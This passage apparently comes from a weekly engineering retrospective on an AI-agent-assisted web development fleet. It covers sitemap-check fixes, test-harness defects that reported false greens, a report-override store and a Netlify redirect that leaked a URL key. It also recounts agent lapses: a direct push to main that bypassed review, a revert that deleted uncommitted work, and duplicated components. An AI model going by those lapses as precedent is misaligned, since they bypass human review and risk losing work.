audit work, are we ready to write the battery into the output?"_ At 13:02, after
being offered options: **"finish it"**.

What followed is the week's clearest instance of the founding rule, and the
journal records it in full. The parts worth carrying forward are the **three
instruments that had to be disqualified before any verdict could be read**:
`pnpm lint` in the main checkout reported **1,771 errors**, every one the same
typescript-eslint parser error and every one naming a file under `.worktrees/` —
other sessions' checkouts, which ESLint walks because it does not read
`.gitignore`; in a clean worktree the count was **1**, and that one was real. The
full suite reported **49 failures**, all `listen EPERM` — the Bash sandbox
refusing sockets; the same eight files passed **96/96** outside it. **Neither
number was a finding about the code. Both were findings about the instrument.**

The third disqualification is the real story. The corpus replay reported **zero
verdict changes** from the patch, which would have closed the question — except
the dumps on disk still showed coyote.us at 46 missing URLs and
richardmacdonald.com at 52 of 52, _the exact numbers the patch's own comment
claimed to have fixed._ `sitemap-coverage` never called the `norm2` normaliser at
all; it keyed URLs with its own inline `u.replace(/\/+$/, "").split("#")[0]`,
keeping scheme, `www.` and percent-encoding. **The patch had improved `norm2` and
written a correct comment about a function the check did not use. The fix
described was right; the diff had never reached the place it needed to be.**

Then the corrected version was replayed, and the replay caught _that_ too:
sapidyne.com's `description-length` flipped to "all 1 are between 40 and 200
characters", because sapidyne declares `/` as the canonical on **19 of its 20
pages**, so folding on the declaration measured the whole site as one page. The
belief corrected on contact, in one line: **"a page that says it is another page
is not therefore that page."** The rule became `sameDocument` — a page folds only
onto a page we read that reads the same, title, description and headline all
agreeing.

Two limits on the instrument were recorded and both matter downstream: the replay
**compares status only**, so "nothing changed" means no verdict flipped, not that
the change did nothing; and **the disk corpus is the one to replay**, because the
database rows predate the fields the new checks read.

COST, MEASURED: the PR opened 21:36Z and merged 21:56Z — twenty minutes as a PR,
but the work behind it ran from 12:31 to ~21:30 local. And **the release that
followed failed on `main`**: `release.yml` also runs the suite, so it also needs
a Playwright browser installed. A gate had been added to `ci.yml` and nothing had
been added to the workflow that actually reds `main`.

Two days later the same check class produced its own sequel. Reading the _lists_
rather than the counts found that sapidyne's 37 "missing" pages are
`/uploads/1/1/8/8/…` — technical notes, handling guides, a price list — and
theburbankstudios' 90 are `/api/media/file/…` and floorplan images. **A sitemap
lists pages.** The replacement rule is an allow-list of page extensions rather
than a deny-list of file ones, "because the two fail in opposite directions: an
extension we did not think of reads as a file and is quietly excused, which costs
a finding, where a deny-list would read it as a page and demand a stranger list
their `.dwg`. **Missing our own gap beats printing their fault.**" And one level
up, in the crawl: `parseSitemapLocs` allowed an optional namespace prefix on
`<loc>`, correct for `<sitemap:loc>` and wrong for **`<image:loc>`** — the image
extension Squarespace, Wix and Yoast all emit. **Eleven of the 29 corpus sites
carry them**; one site lists thirteen pages and sixty images, and the row we
would have shown them read "73 URLs listed."

**And the replay could not judge that fix, which is the point.** It re-scores
checks over stored crawls, and the URL count in those crawls was computed by the
old parser _at crawl time_ — a crawl-layer fix is invisible to it, and a green
replay would have meant nothing. Proven on live sitemap bytes instead: 73 → 13,
52 → 1, and **reddoorla.com 49 → 49.** _"That last one is the one that matters,
because an instrument that only ever changes numbers has not been shown to leave
a good sitemap alone."_

## Tucker reads the output and finds a client-facing defect nothing was checking

At 18:04 Tucker pastes a block of the generated report back into the session:

> What the AI says about you that is not on your site
> We did not find these on your site.
> — The company's legal name is Reddoor Creative, LLC.
> — Reddoor Creative is a design agency.
> — The business is based in the Los Angeles area.
> …
> several of these things are on our site...

**This is the most important prompt of the week and it contains no instruction.**
A section of a **prospect-facing sales artefact** was asserting, in Reddoor's own
voice, that facts plainly present on the site were absent from it. No gate had
this in scope. No test could have: the section is a judgement, not a boolean.

The next morning he specifies the fix as copy, not code — _"change it to 'these
are claims that seem not to be sourced from your site'"_ — and then refines it
again in a way that is really a statement about epistemics:

> _"now the hedging is honest and necessary; there's a greyness in things that
> are said elsewhere but could be implied from our site. For instance 'A man
> named Tim leads Reddoor Creative.' I'm guessing AI got this from linkedin
> because tim is more active than erik there, but both tim and erik are listed on
> our site, so it's a bit overblown to say its not on our site, even though it
> flags real misleading information"_

**And it produced the whole second workstream of the week.** At 10:18 the same
morning, in the same breath as a UI request: _"**if we want to edit your
generated copy before we send to someone, can we do that?**"_ Then at 10:52: _"is
there a way we could integrate it with prismic? have a source report but any line
of it can be overwritten? or do some thinking/investigation and come back with
recs."_ MEASURED: from that question to the design spec approved ("spec is
approved", 17:47) is **6 h 55 m**; to two implementation plans merged the same
evening is **~8 h**.

**The override layer exists because a generated artefact said something false
about Reddoor and the operator decided the right answer was a human override
rather than a better generator.** The Prismic option was investigated and ruled
out on evidence, not taste: the content API answers anonymous callers across six
fleet repositories, "so a private Prismic repo would be new ground for this fleet
rather than a setting to flip", and the audit's whole privacy model is that the
128-bit token in the URL _is_ the credential — _"Prospect audits are critical
assessments of strangers' businesses that often name their competitors.
Publishing those into an enumerable content API would undo all of it."_

One belief corrected on contact in the same design session, and it is a good
example of scope changing a design property: the agent told Tucker the edit layer
could live entirely in maintenance with no website change, because the JSON route
hands `result_json` back byte for byte and the website is a dumb renderer.
**That holds only for the scope the agent recommended.** Tucker chose "any
rendered line", and the website _composes_ some sentences itself — six named
functions and every health-row label — which never exist in the stored payload,
so no merge in maintenance can reach them. _"The clean one-repo property did not
survive the scope decision, and saying so before designing around it was cheaper
than discovering it in implementation."_

## claude-skills: seven skills extracted, and a deliberate rule break

Tuesday morning, in `reddoor-starter`: _"I want to do a few more webflow
converstions like we did with beachfront, would it make sense to build another
offshoot of this starter repo to that purpose?"_ — and immediately the constraint
that shapes the answer: _"the thing is that I don't want to carry bloat into a new
site, we jsut spent a lot of work breaking out the blux site before working on
vlf since baking it in corrupted the starter."_ **A belief formed by injury in an
earlier week, applied correctly.**

Over four prompts he pushes on the alternatives and lands on no new template at
all, then: _"and where should this work live if I want it to be repeatable for
new sites? … repeatable shouldn't be just skills yes? are the scripts all in
place and acceptable? … understood, let's get the skills tight with the aim of
starting a new site at the end of this session."_

`reddoorla/claude-skills` was created the same day: **67 commits, 89 tracked
files**, 83 of them under `skills/`. Two skills came in via `git subtree add` so
their history survives; the other five had no history anywhere and got one honest
first commit each.

Three defects were found on the way in, all the same genre — **code that had
never been exercised the way it would now be exercised.** Entry-point checks
silently no-op'd through a symlink: reached through one, `process.argv[1]` keeps
the symlink path while `import.meta.url` is the real one, so the equality is
**false** and the CLI exits 0 having done nothing, with no error — and two
scripts had that shape and had simply never been run through a symlink, **which
is exactly what an installed skill is.** Exactly one machine-bound absolute path
existed across 83 files, and a different class — 32 `~/Documents/GitHub`
references — was _not_ caught by that search and had to be found by hand. And
the repo's own gate could never run: `node --test test/` is not a directory scan.

A measured storage note worth keeping: the local skill directory was **354 MB**,
~71 MiB of it unreachable objects from an aborted `git add`. Cloning through the
transport path rather than hardlinking, then `git gc --prune=now`, produced
**212 K** of `.git` with history intact.

**The deliberate rule break.** The whole import landed on `main` **directly,
without a PR**, because a squash merge would have destroyed the subtree history
that was the entire point. The reason is written into the README and the journal.
This is a case where the merge contract and the goal were in direct conflict, and
the resolution was an undocumented-until-now exception. It worked, and it is the
kind of thing that should be a **named exception in `AUTONOMY.md`** rather than a
decision re-derived each time.

## The portfolio pin: nine commits, one Zoom, and a full circle

Tim's Discord ask had two parts: OG images for every page (_"It shouldn't be the
PNG of the debossed reddoor logo. It looks super cheesy."_) and a sticky
per-project title on the portfolio page, delivered as a **Dropbox screen
recording**.

The OG half is clean engineering: satori plus resvg-wasm, fonts bundled, the wasm
inlined, cards drawn **at build time** because a serverless function was the
wrong place. One correction from Tucker — _"just use the title by default for the
text, if we want something else we'll add it ourselves"_ — turned into a PR
titled _a generated card says the page's title, not invented copy_.

The sticky-pin half is the friction story. Ten commits in one day, and **the
tenth returns to the fourth**: pin each title block → bare-type pin → under the
nav → name and arrow only → subheading size → back at body size → stack the arrow
→ red arrow on a translucent disc → pad behind the whole pin → **drop the pad,
the pin is bare type again.** The prompts that drive them are short and
explicitly revisionary: _"noo halo, and lets kill the media discriptors"_ …
**"ok I preferred the old way, go back to that but keep the scaled down arrow"**
… _"make the arrow red and bg-fff/30, p-4"_ … _"sorry not just the arrow, the
whole pin with the title"_ … **"hmmm go back to no bg for now"**.

Then rounds 2 and 3 on Wednesday and Thursday (+486 / −54, open **26.1 hours** —
the longest-held non-bot PR of the week), and on Thursday Tim writes: _"A couple
of small notes, not sure what possible for where the sticky title stops and
starts. I may be getting too icky/nerdy about it"_ → _"I'll can jump on a zoom or
make a video"_ → Tucker: _"drawing is best, I can hop on zoom if you prefer"_ →
_"let's do a quick zoom."_

**COST, MEASURED:** across three days `reddoor-website` took **72 commits**, of
which roughly 20 are the pin. Cycle time per iteration is minutes; **the latency
is entirely in the Discord round-trip.** Tucker's own message on Wednesday shows
he had already priced it: _"remove the padding on the pin, I already know we're
going to get pinged for it not being flush with nav home link."_ **He was
pre-empting a review round he could predict and could not avoid.**

This is not an agent failure — every agent turn was correct and fast. It is a
**specification-channel** problem: pixel-level design intent arriving as
prose-in-Discord plus a .mov, with no shared artefact to annotate. The one thing
that broke the loop was a Zoom call. Notably, a _different_ channel already
exists in this fleet and was not used — the `markup-review` skill works a
MarkUp.io board of pins. INFERRED: it was not used because Tim was reviewing a
deploy preview, not a board.

## 29 Navy: bootstrapped overnight, and what that proved wrong

Tuesday 17:21, a new session in a directory that did not exist yet: _"alright,
ready to convert this site, what do you need from me to get runnin on this?"_ By
23:42 Tucker had read the plan set and issued the handoff that defines this
fleet's operating mode:

> _"ok, do BC, ask me any questions or permissions you need from me now, i'm
> going to sleep and want you to run as autonomously as possible"_

then at 23:46: _"published, going to bed."_

By the following morning the repository had gone from `Initial commit` through
bootstrap, Prismic wiring, Netlify, a delivery workflow and a live deploy. The
29-navy journal carries **six entries dated 09-08, of which three are corrections
of the entries above them** — the honest-history rule working at high frequency,
and also a signal: **on an overnight autonomous run, a third of the recorded
findings were wrong on first writing and caught on re-reading.**

The plan itself, written for Beachfront, was wrong about 29 Navy in four ways
that a Phase 0 capture measured the next day, and the journal is emphatic that
the _pattern_ matters more than any one of them.

**The matrix.** The recipe seeds `1440 / 834 / 390`. The reference's own
stylesheet has twelve `@media` blocks whose three site-authored members are
`max-width` 991, 767 and 479. The real matrix is `1440 / 991 / 767 / 390` — **the
seed would have missed two of four bands.**

**The fonts.** The plan warned that all three Font Awesome faces must report
`document.fonts.check` true. Two report false, correctly: of 190 elements on the
live page, **0** compute to either, and the `FontFaceSet` lists both `unloaded`.
_"Had this been fixed, the fix would have been to a bug that does not exist."_

**The first floor.** The plan counted ten `display: none` modals including
`._1st-floor-modal`. Measured at 1440 it is `display: flex`, in flow, **1174×750
at (246, 1908)** — the default visible panel of a floor switcher. A rebuild
hiding it would be ~750 px short and the symptom would read as a layout bug. The
journal calls this _"the one that would have cost a day in Phase 5."_

**Time pressure, stated:** the reference is a live Webflow site that dies at DNS
cutover, and **Beachfront's reference already died mid-campaign** — a check
against it still answers HTTP 404. So Phase 0 captured **90 files, 13,667,608
bytes** with a tracked sha256 manifest, and nothing was rewritten (an absolute
CDN href stays absolute) because the capture is what Phase 1 greps.

## The match-harness saga: six defects in code that was reviewed three times

This is the week's centre of gravity, and the one sentence that explains all of
it is in the journal:

> _"Found by using the `match-harness` recipe rather than reviewing it. Three
> adversarial review rounds on #733 did not surface this; installing the harness
> on 29 Navy and running the real gate against a real reference did, in one
> command."_

MEASURED: #733 was **+5,058 / −1 across 18 files**, opened 19:15Z and merged
23:39Z — **4 h 24 m** — carrying 26 tests and **zero GitHub reviews** (as did all
123 PRs this week; review is entirely in-session `superpowers:code-reviewer`
subagents — 34 invocations — plus adversarial self-review). **Within 24 hours of
merge, four defects in it were found and fixed in four separate PRs**, and two
more followed.

**Defect 1 — `applied` for an install git silently dropped.** `matchHarness`
writes 20 paths and commits through a shared `commit()` that stages with `git add
-A`. `git add -A` honours `.gitignore`, exits 0 either way, and **git cannot
re-include a file whose parent directory is excluded.** Measured on a real repo
whose `.gitignore` already carried `matching/`: **13 of 20 paths on disk, 0 of
them in the commit, both git commands exit 0, result `applied`.** What the
operator is left with is worse than nothing — a `/dev/match/[uid]` route and 83
lines of CLAUDE.md instructing the next agent to run scripts that exist on one
machine and on no other clone, CI runner or agent.

**The abandoned approach is the instructive part.** A pre-write ignore preflight
(`git check-ignore` in `plan()`, before a byte is written — the friendlier
failure, leaving zero residue) was designed, built, tested — **and abandoned**,
because it refuses two configurations that actually work: the recipe's own
appended block re-includes `!matching/*.sh` and `!matching/*.mjs` _after_ the
site's rule, and because the `matching` directory itself is not excluded, git
still descends into it. **The question "will git take this?" is only answerable
after the final `.gitignore` exists.** There is now a **negative-control test**
whose only job is to go red if someone re-adds that preflight. And the refusal
path had to put back, itself, every path the run wrote and git then refused —
because those paths are ignored, so `withRecipe`'s branch cleanup does not know
they exist.

**Defect 2 — `census.sh` shipped a green nobody measured.** One of seven files
the recipe copies _verbatim_ into every site. #733's 26 tests touched none of it.
It printed `Phase 3 CLEAN — 0 undeclared type mismatches` and exited 0 **without
measuring anything**, in seven distinct ways. Five became vitest cases watched
red first; two were measured by hand in a scratch tree, _"because they have no
test and I would otherwise have been asserting them."_ **The blast radius is why
it was a blocker: every site the recipe installs gets this file, and the failure
is silent in the flattering direction** — it is the gate that catches the 11 px
footer line and the cyan-vs-teal link the pixel diff is structurally blind to,
answering "clean" because it never looked.

And then **verification found an eighth member of the class**, which is the more
valuable half: a **complete** census — header present, counts line present,
`mismatches: 3` — whose detail rows carried one leading space instead of two
printed `Phase 3 CLEAN`, exit 0, over a log that says on its own second line
there are three. The guard matched the counts line with `grep -qE`, which answers
_is it there_; **the number it contains was thrown away, and the count actually
reported came from a different parser.** Two readers of the same artefact and
nothing comparing them. _"The first fix demanded the artefact exist. It did not
demand that the artefact and the number agree."_ The comparison's exact shape had
to come out of the printer's source: mismatches truncate at 100 rows and state
the remainder, ambiguous rows truncate and state nothing — so the identity is
exact for one and only a floor for the other, **and an equality check written
without reading that would have refused every census over 100 mismatches.**

**Defect 3 — an unbounded `pnpm exec` inside every fleet clone.** The format step
called `formatWithPrettier` with neither `bin` nor `timeoutMs`, which becomes
`pnpm exec prettier --write …` with **no timeout, no process group, and nothing
to kill**. A cloned site has no `node_modules` — the clone helper contains
neither the token `pnpm` nor `install` — so this is an **unrequested full install
in a live client repo**, which is also how a swept `pnpm-lock.yaml` would have
got into the recipe's commit. And `pnpm exec` then falls through to the _calling_
repo's binary and exits 0, **reporting success for a format the target never
did.** The defect class is **three call sites, not one**; the other two are still
on `main` at week's end, filed rather than folded in, "because each needs its own
mutation-proven surgery and stacking two unrelated recipe fixes into a draft
feature PR is the batching mistake this file already records."

**Defect 4 — `ALL DONE` over runs that never happened.** The reproduction is
three lines:

```text
########## home ##########
home exit=1
ALL DONE (smoke)
```

`gate.sh:120` was `echo "$page exit=$?"` — **it printed the status and discarded
it.** And `next.mjs` summed its denominator only over pages that produced a
parseable report, so **eight of nine pages could print `SCORE 160/160 regions
passing` while the ninth was never measured.** The fix demands an artefact per
run rather than trusting a status, with a freshness arm, because the output
directory is never cleared — _"requiring `report.json` alone would have
reproduced the same green one step along."_

**Defect 5 — `SCORE 12/3`, and "Backlog is empty".** `harness.mjs` derived a
page's region total as `(anchors.length + 1) × MATRIX.length`, an exact identity
for an _anchored_ run and nothing at all without anchors — because `splitRegions`
falls back to the page's own `<section>` boxes and then to an even four-row grid.
On the untouched recipe seed page-diff produces **12** grid regions and `next.mjs`
printed `SCORE 12/3 regions passing`, then `No open geometry failures` and
**`Backlog is empty`**, exit 0. On 29 Navy's four-viewport matrix, `SCORE 16/4`.
The journal's line is the one to keep:

> _"The absurd fraction is the harmless half — someone questions 16/4. Nobody
> questions 'Backlog is empty', and it prints from the same run."_

**And the expensive part: two tests had asserted the defect as correct behaviour
since the recipe shipped**, one of them carrying the false derivation written
down as fact in a comment (`// 3 = (0 anchors + 1) × 3 viewports`). They passed
because the fixture supplied exactly 3 regions and the fiction `(0+1)×3` is also 3. **The fiction and the fact coincided, so nothing looked wrong.** Both fixtures
now use 12 regions against a fiction of 3 specifically so the two numbers can
never agree again.

Understated in the original issue and caught on the fix: `scored` sorted by `pass
/ total`, and **an unanchored page's ratio is not bounded by 1.** A passing page
scored `16/4 = 4.0` and sorted _last_ (best); a failing one scored `0/3` and
sorted _first_, so the agenda printed `NEXT: about — worst page` with a list of
`grid-0-0`, `grid-1-0` … — **an instruction to fix geometry against regions
page-diff invented.** The fix REFUSES rather than relabels, prints the run's own
region count as evidence for the refusal, and exits 2; with nothing scorable it
prints `NO SCORE — 0 of N page(s) have anchors` rather than `SCORE 0/0`, _"which
is a third lie and the one that reads best of all."_

**Defect 6 — installed sites could never be corrected.** A recipe-owned file that
matches neither the new template nor a _recorded previous body_ is FLAGGED, never
overwritten. With zero terminators in the three marked blocks, their contents
could never be corrected at all — and on `.gitignore` **that is not staleness but
a brick**, because it is a negated whitelist over `matching/*`, so a harness file
at any path it does not re-include is on disk, absent from the commit, and the
new guard then refuses the entire install. _"So the recipe could brick itself on
the next file it gains, with the fix sitting in a file it had promised never to
touch again."_ The fix welds two designs together — a terminator makes the region
addressable _from now on_; byte-matching against a previously shipped body is
what makes the FIRST transition safe on a v1 region that has no terminator to
find. And "the region runs to end-of-file" was **rejected on evidence, not
taste**: `sync-configs` appends its own managed block at EOF into the same files,
so an EOF-delimited replace would eat the canonical fleet ignore entries. _"29
Navy happens to have nothing after its blocks, which is precisely the accident
that makes a bad rule look fine."_

**Two mechanics that cost real time and are worth not rediscovering.** The
documented mutation loop — edit beachfront, regenerate, test, revert beachfront,
regenerate — **does not restore `template.ts`** under the carry-forward design
that briefly existed on `main`: the generator files the _mutant_ as a legitimate
prior release, and one mutate/revert cycle left the file **693 lines larger**
carrying two copies of the same predicate. The only correct revert is `git
checkout --`. And `node matching/next.mjs | head` reports `$?` as **`head`'s**
status under zsh — read as exit 0 when the real answer is 2. `${PIPESTATUS[0]}`
is bash; zsh wants `$pipestatus[1]`. **This cost a wrong reading in the same hour
it was written down.**

A third mechanic cost the most: reverting a mutation with `git checkout --
src/recipes/match-harness/index.ts` **deleted the entire uncommitted
implementation, silently.** The standing rule about reverting that way is written
for the _generated_ file, where HEAD is the truth, and it is exactly wrong for
authored work not yet committed. Three mutations that followed then "passed"
against the original code and their reds were meaningless; every mutation had to
be re-run against a saved pristine copy with `diff -q` after each revert as
positive evidence.

**An architectural oddity for a reader to note, MEASURED:** the canonical source
for the harness template is **a client repository**. `template.ts` is generated
from `beachfront-dentistry/matching/`. The journal states the consequence
plainly: _"anyone regenerating from a stale beachfront clone silently reverts
this fix while the generator cheerfully prints `17 files, all round-trip
verified`."_ And as of the corpus snapshot, beachfront's main checkout is parked
on a fix branch, not `main`. The safety procedure is "regenerate first and
confirm a byte-for-byte no-op" — **a discipline, not a mechanism.** Measured on
09-10: beachfront had drifted from the shipped template on three files by **313
changed lines** against its `main`, and 429 against its open branch.

## Wednesday night: GitHub was the problem, and a throwaway PR proved it

22:20 Wednesday: _"can you diagnose the actions issue?"_ → 22:34: _"yes"_. The
measured artefacts are a commit titled `chore: probe whether Actions creates a
check suite for a new PR` and a PR — **+0 / −0, 0 files, state CLOSED.** And in
Discord the same day, to Tim: _"github is having issues again so currently on
this branch instead of staging"_ — the deploy-preview link handed over on a
branch preview because the staging pipeline was not producing runs.

This is a healthy pattern (build a minimal probe rather than reason about a
platform) and a cheap one. It is also **the second time this fleet has spent
operator attention on GitHub-side flakiness in a week, and there is no persistent
record of it beyond a closed throwaway PR.**

## Thursday: the blank page with three unrelated causes

Tucker at 13:09, one line, three symptoms: **"ci failing, no content on the page
only the nav, no favicon"**. They were three unrelated defects that happened to
be visible at once, and each is a different failure genre.

**CI: a test that could only run on the machine that captured the reference.**
`NavyContact.test.ts` read `matching/spec/index.html` at _module scope_ to derive
its expectations from real markup. Sound reasoning — but `matching/*` is
gitignored on purpose, so the file exists on every machine that ran the harness
and on no CI runner. A module-scope read throws ENOENT during **collection**,
taking the whole file down: CI reported `1 failed | 50 passed` and `422 passed`
against **445 locally** — **23 assertions about the contact band silently stopped
running**, and the failure named a missing file instead of anything about
contact. The journal names the genre precisely: _"not a check that passed without
evidence, but a check that vanished without saying so."_

**Empty page: a belief corrected.** The previous entry had said `/` renders empty
because the home document is not seeded, and treated that as the whole story.
`customtypes/page/index.json` — **the slice zone Prismic actually enforces** —
carried the nine template slices and **none of the five `navy_*` ones.** Seeding
would have returned HTTP 200 and published a document with **zero slices**, and
the page would have stayed exactly as empty _with the seed looking like it
worked._ And a test named _"declares every field the documents set, so Prismic
strips nothing"_ existed — it compares documents against slice **models**, all of
which were present and correct. **The zone is a separate declaration in a
separate file and nothing compared anything to it.**

**Favicon: a placeholder that answered 200.** `static/favicon.png` was the
template default — 128×128, 8-bit grey+alpha, 1,571 bytes. It existed, it served,
`curl` said `status=200 type=image/png`. _"Every check that asks 'does the icon
resolve' was green while the tab looked blank."_ The test now asserts **byte
equality** with the captured originals, "because existence is precisely what was
already true."

Each new guard was broken on purpose before being kept.

## The override layer: four instances of one bug, and three probes that proved nothing

**The store.** Three columns on `prospect_audits`, a validator, two writers. The
migration split was **proven rather than argued**, constructed against the real
runner:

```text
COMBINED, crash mid-run + lost marker, re-run:
  marker recorded=true; overrides_json=true edited_at=false opened_at=false
  → marker says applied, two columns permanently missing
SPLIT, same crash: all three applied, all markers present → survives
```

**One bug, four instances, and the pattern is the finding: validate one object,
serialise a different one.** `Object.values()` on a non-plain object returns `[]`
and `[].every()` is vacuously true — a `Map` returned `updated`, stored `{}`, and
stamped `edited_at`: **the operator's whole map discarded and reported as saved.**
A circular reference threw a `TypeError` out of a function declared to return a
three-way union. **2,288,891 characters** were accepted in one write, on a value
re-served on every view from a metered store, where the sibling operator-write
path caps at 2,000. And `__proto__` was stored verbatim, so a consumer in a
separate repository using `Object.assign` measurably gets its prototype replaced.
Fixing them individually treats symptoms; the close was to **build the stored map
from the fields the validator approved, so the stored bytes are the checked bytes
by construction.** Honest note in the entry: none of the four is reachable from
the live path, because the caller is an HTTP JSON body. They were fixed because
the validator's stated contract is that it is the only place a malformed value
can be caught — _"and a gate that passes on questions it cannot fail is the thing
this repo has a rule about."_

**The deploy gate nobody had checked.** The plan said "Task 1 must be deployed
first." It was merged, and it was live — **on `staging` only.** `reddoorla.com`
builds `main` and was publishing `origin/main` exactly, where `fetchReport` still
ended `return (await res.json()) as AuditReport`. **That is a cast, not a parse**,
so handed the new wrapper it does not throw: it yields a report object whose
every field is `undefined`. A premature deploy would have produced **blank
reports, silently, on every prospect link already sitting in an inbox** — and on
the PDF leave-behind with them, because the PDF renderer captures the same route.
No 500, no error page, nothing a nightly catches. Measured while resolving it:
`main..staging` was **36 commits**, `staging..main` 4. And the first run of that
probe failed **37 of 38 test files** with `TSCONFIG_ERROR` — the absent generated
`.svelte-kit/tsconfig.json` on a fresh worktree, a known trap hit again.
_"svelte-kit sync first, always."_

Also caught here: **a read route that amplified into writes.**
`touchProspectAuditOpened` stamped on every GET of an unauthenticated route
rate-limited at 120 req/min per IP — **~172,000 writes a day from a single
address**, into the Turso project the whole fleet shares, configured `overages:
false`, **where crossing quota blocks reads _and_ writes for every site at
once.** That is an outage vector, not a billing detail. Coalesced to a
five-minute window **inside the `WHERE` clause** so two concurrent opens cannot
both decide to write.

**Three probes that proved nothing.** This is the entry a workflow reader should
read twice, because each of the first three attempts to prove the page renders
the new payload looked convincing.

_Does the page name the business?_ Contaminated — the audit is of reddoorla.com
and "Reddoor" is in the marketing site's own nav and footer.

_Does the page contain the report's check copy?_ Contaminated **structurally** —
the design doc already says check labels and reasons live in source across both
repositories, so a hit could be website-resident copy.

_Does the page render this run's measured scores?_ Inconclusive, **and only
because a control was included**: three of four scores matched, but the control
number — chosen precisely because it is _not_ one of this run's scores — **matched
too.** Bare number-matching against a 119 KB document proves nothing. _"Without
the control this would have been reported as a pass."_

What discriminated was the **hydration payload**, because it is what the server's
`load()` produced rather than what a component chose to display. _"The general
lesson is the repo's own rule pointing at probes rather than at gates: a probe
run only against the state you expect cannot tell you anything."_

**And the same shape one day later.** The first run of the end-to-end edit proof
chose `siteChecks.data[0].why` as its subject — **a key whose text the report
does not render.** So "the edited text is not on the page" was true and "the
original is not on the page" was also true, and the output read as a clean
_failure of the feature._ MEASURED: of 230 candidate strings in that payload,
only **145 are rendered at all.** The generalisation is the keeper: **a probe
that does not verify its own subject is observable is not measuring the thing it
names, and it will fail in the direction that looks like a real finding.**

Once fixed, the proof is six lines and every step is against production:

```text
PRECONDITION  original is on the live page ......... true
1. SAVE       POST /api/audit-report/:token/overrides  200 {"ok":true}
2. API        serves the override back, editedAt set .. true
3. PAGE       renders the edit, original gone ........ true
3b. PRINT     renders it too, so the PDF follows ..... true
4. REVERT     mark gone, original restored ........... true
```

One residue worth noting, because it is the kind of thing a revert does not
clear: `edited_at` is now stamped on Reddoor's own audit row, and **the column
has no "never edited" state to return to once a save has happened.**

## The Netlify finding: a security property the platform quietly undid

The edit route takes `?k=<key>`, exchanges it for a cookie, and 303s to the bare
path — which is what is supposed to clear the key from the address bar. Measured
on the deploy preview, the `Location` header **still carried `?k=`**.

The first diagnosis was honest and inconclusive and was committed as such: _"this
repo defines no redirect rules, so something downstream appends it — **cause not
isolated** … **Someone should still find out why.**"_ The client-side
`replaceState` scrub went in as belt-and-braces.

Then it was isolated **with a control**: a marker param was added, and the 303
came back carrying `?k=<key>&zzzmarker=1` — the whole original query — and
**Netlify's own trailing-slash 308, which this repo does not author, preserved it
too.** Two redirects, one ours and one the platform's, both appending. So no
server-side `Location` can defeat it, and the comment in the code was rewritten
from `// BELT AND BRACES over the server redirect.` to `// THE ONLY THING THAT
CLEARS THE KEY FROM THE URL.`

The generalisation, quoted: **"anywhere in the fleet that strips a sensitive
query parameter by redirecting to a bare path, on Netlify, is not doing what it
looks like it is doing."**

**AND HERE IS WHERE THE EVIDENCE DIVERGES FROM THE RECORD.** MEASURED at the
corpus snapshot: both journal commits carrying this finding are on
`feat/report-edit-mode` and `staging`. `origin/main`'s `docs/workJournal.md`
contains **exactly one** `## 2026-09` entry — the 09-05 opener. `origin/staging`
is **15 commits ahead of `origin/main`.** So **the week's single most transferable
fleet-wide finding is not on the branch a reader of that repository arrives at.**
The journal rule's value depends entirely on the entry being where someone lands,
and the staging→main promotion flow silently defers that.

## "the second time today I've had an agent try and invent a component"

Friday 09:20, in 29-navy: _"slider is in a rough state right now, most of the
time it's just grey."_ Twenty-one minutes later, the question that matters:

> _"clicking a slide should reset the autoplay timer. **Did you build your own
> slider or use the implementation we already had in reddoor starter?**"_

The journal's answer is its own heading: _"I should have read the starter
first."_ `src/lib/components/Slider.svelte` was in that repository — 12 KB, with
tests, shipped from the starter — referenced only by the a11y fixtures route. It
already had autoplay with pause-on-hover, pause-on-hidden-tab, APG focus
handling, reduced-motion, loop and fade modes, and an `autoplayEpoch` whose
comment reads _"Re-key the interval on swipe navigation so a gesture restarts the
full delay"_ — **precisely the feature being asked for.**

The entry is careful about what is and is not excused. The _outcome_ (a separate
component) was probably right: this is a pixel-matched Webflow rebuild whose gate
compares against transcribed Webflow class names, and the starter's Slider owns
its own wrapper markup. **The process was not right**: the file was never opened,
so the logic sitting there was never copied, two answers were re-derived, and one
of them _was escalated to the operator as a decision only they could make_.
Re-tested against the starter's answer, the conclusion survived — but with a
materially better statement of the problem that would have been available a day
earlier.

At 10:05 Tucker generalises it:

> _"ok, slider looks good, but this is the second tyime today I've had an agent
> try and invent a component rather than using battletested code I've already
> built. **how do we fix this?**"_

MEASURED: the journal for the next PR that afternoon is headed _"the third time
$lib solved it first."_ **Three instances in one day, across two repositories.**
Two of the three came from the shallow client lane, not the flagship session.
(And this is not new: _"don't roll your own slideshow, we have a component for
that"_ was a correction in week 3, and _"we have this implemented already, check
other repos for how we do video"_ is another the same week.)

**And then the correction that is the best workflow artefact of the week.** The
proposed answer was a CI audit. At 12:44:

> _"the worry here is that this feels retroactive, when the goal is to avoid
> doing duplicate work, so by the time you've run the check the cost of failing
> has already ocurred"_

The journal records the inversion in full: _"Correct, and it inverts the design.
I had optimised for **unevadable** when the goal is **never started**. A gate
that fails in CI saves the merge; it does not save the hour, and the hour is the
thing being wasted. Worse, I had ranked the three candidate designs by fleet
reach and evadability — both properties of a detector — and put discoverability
last, which was the only one of the three that fires before the work."_

What shipped instead: `scripts/capability-index.mjs` generating
`docs/COMPONENTS.md` — **50 modules** from `src/lib`, each with its real
prop/export names, test count and first sentence, pointed at from CLAUDE.md's
orientation table so it is in front of an agent **before** any decision; a
`UserPromptSubmit` hook that surfaces matched entries on the prompt, before
anything is written; and both shipped to every new site via the starter.

Three design decisions inside it are worth keeping. **No `@provides` tags** — _"a
tag nobody updates is worse than no tag, and the authoring tax falls on exactly
the person already not reading the directory"_; prop names are the capability
surface and cannot drift because they _are_ the code. **Its own test caught the
first defect in it**: the generator began with an allowlist (components, actions,
utils, stores) and the test asserting the three actually-re-derived modules
appear failed immediately, because one of them sits at the top level of
`src/lib`. _"An allowlist encodes a guess about where people put things."_ 40 →
50 modules. And **a generated file cannot also be a formatted file** — prettier
realigns markdown tables, which rewrote every row and left the freshness check
failing forever against a file nobody had edited.

The honest limit, stated: _"CLAUDE.md already said to check for existing work. I
read it at session start and re-derived three things anyway. The instruction was
never missing; the DATA was. … **Recognition is a different mechanism from
recall, and only one of them had been tried.**"_

**One blocker was handed back to the operator and is still open:** `.claude/` —
where a `UserPromptSubmit` or `PreToolUse` hook lives, and hooks are the only
surface that can _interrupt_ before writing starts — is **gitignored in
`reddoor-starter`.** Shipping hooks fleet-wide needs that policy changed.

## The false fail that looked like four phases of geometry failure

29 Navy's `Creative Lofts` region had been failing 34–38% for five phases. **The
